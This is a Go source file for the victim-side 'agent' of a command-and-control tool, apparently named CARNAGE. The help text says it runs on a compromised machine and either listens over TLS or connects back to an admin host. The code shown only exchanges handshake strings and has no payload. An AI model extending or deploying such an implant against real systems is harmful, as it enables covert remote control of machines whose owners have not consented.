package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/spf13/cobra"
)

var (
	agentListenPort int
	agentAdminIP    string
	agentAdminPort  int
)

var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Modo Agent (víctima): escucha o conecta al Admin",
	Long:  "El Agent se ejecuta en la máquina comprometida y espera instrucciones del Admin.",
}

var agentListenCmd = &cobra.Command{
	Use:   "listen",
	Short: "Escuchar conexiones del Admin",
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := fmt.Sprintf("0.0.0.0:%d", agentListenPort)
		cert, err := generateSelfSignedCert()
		if err != nil {
			return fmt.Errorf("error generando certificado: %w", err)
		}
		ln, err := tls.Listen("tcp", addr, &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS13,
		})
		if err != nil {
			return fmt.Errorf("error escuchando en %s: %w", addr, err)
		}
		defer ln.Close()
		fmt.Printf("[+] Agent escuchando en %s (TLS)\n", addr)

		ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
		defer cancel()

		go func() {
			<-ctx.Done()
			ln.Close()
		}()

		for {
			conn, err := ln.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return nil
				default:
					fmt.Printf("[-] Error aceptando conexión: %v\n", err)
					continue
				}
			}
			go handleAgentConn(conn)
		}
	},
}

func handleAgentConn(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 64)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Printf("[-] Error leyendo de %s: %v\n", conn.RemoteAddr(), err)
		return
	}
	fmt.Printf("[+] Admin conectado desde %s: %s\n", conn.RemoteAddr(), string(buf[:n]))
	conn.Write([]byte("CARNAGE_AGENT_OK\n"))
}

var agentConnectCmd = &cobra.Command{
	Use:   "connect",
	Short: "Conectar al Admin (modo inverso)",
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := fmt.Sprintf("%s:%d", agentAdminIP, agentAdminPort)
		conn, err := tls.Dial("tcp", addr, &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS13,
		})
		if err != nil {
			return fmt.Errorf("error conectando al admin %s: %w", addr, err)
		}
		defer conn.Close()
		if _, err := conn.Write([]byte("CARNAGE_AGENT\n")); err != nil {
			return fmt.Errorf("error enviando handshake: %w", err)
		}
		buf := make([]byte, 64)
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			return fmt.Errorf("error leyendo respuesta: %w", err)
		}
		fmt.Printf("[+] Conectado al Admin. Respuesta: %s\n", string(buf[:n]))
		waitForSignal()
		return nil
	},
}

// Evita warnings de imports no usados
var _ = context.Background
